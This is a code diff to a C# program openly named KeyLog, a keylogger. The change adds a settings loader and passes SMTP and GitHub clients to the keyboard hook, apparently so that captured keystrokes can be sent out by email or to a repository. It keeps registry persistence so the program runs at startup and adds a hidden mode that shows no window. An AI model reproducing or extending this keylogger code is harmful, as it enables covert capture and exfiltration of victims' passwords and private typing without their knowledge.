@@ -12,14 +12,23 @@ namespace KeyLog {
 
     [STAThread]
     static void Main() {
-      SetStartup();
-      KbdHook.Init();
-      Application.Run();
-      // time to make things invisible
-      // Application.EnableVisualStyles();
-      // Application.SetCompatibleTextRenderingDefault(false);
-      // Application.Run(new MainWin());
+      var s = LoadSettings("settings.json");
+      var c = new ProgramConfig(s);
+      var email  = new Smtp(new SmtpConfig(s, "smtp_"));
+      var github = new Octokit(new OctokitConfig(s, "github_"));
+      KeyHook.Init(new KeyHookConfig(s), email, github);
+      Application.ApplicationExit += new EventHandler(Application_Exit);
+      if (c.Startup) SetStartup();
+      if (!c.Hidden) ShowWindow();
     }
+
+
+    static void Application_Exit(object sender, EventArgs e) {
+      KeyHook.Flush();
+      // try { KeyHook.Flush(); }
+      // catch (Exception) { }
+    }
+
 
     // Register this program to run at startup.
     static void SetStartup() {
@@ -27,10 +36,31 @@ namespace KeyLog {
       key.SetValue("KeyLog", Application.ExecutablePath.ToString());
     }
 
-    static void LoadSettings(string path) {
-      var text = File.ReadAllText(path);
+    static void ShowWindow() {
+      Application.EnableVisualStyles();
+      Application.SetCompatibleTextRenderingDefault(false);
+      Application.Run(new MainForm());
+    }
+
+    static Dictionary<string, string> LoadSettings(string path) {
+      var text = File.Exists(path) ? File.ReadAllText(path) : "{}";
       var json = new JavaScriptSerializer();
-      var data = json.Deserialize<Dictionary<string, Dictionary<string, string>>[]>(text);
+      return json.Deserialize<Dictionary<string, string>>(text);
+    }
+  }
+
+
+  struct ProgramConfig {
+    public bool Hidden;
+    public bool Startup;
+
+    public ProgramConfig(Dictionary<string, string> config, string prefix="") {
+      var c = config;
+      var p = prefix;
+      c.TryGetValue(p+"hidden",  out string hidden);
+      c.TryGetValue(p+"startup", out string startup);
+      bool.TryParse(hidden,  out Hidden);
+      bool.TryParse(startup, out Startup);
     }
   }
 }
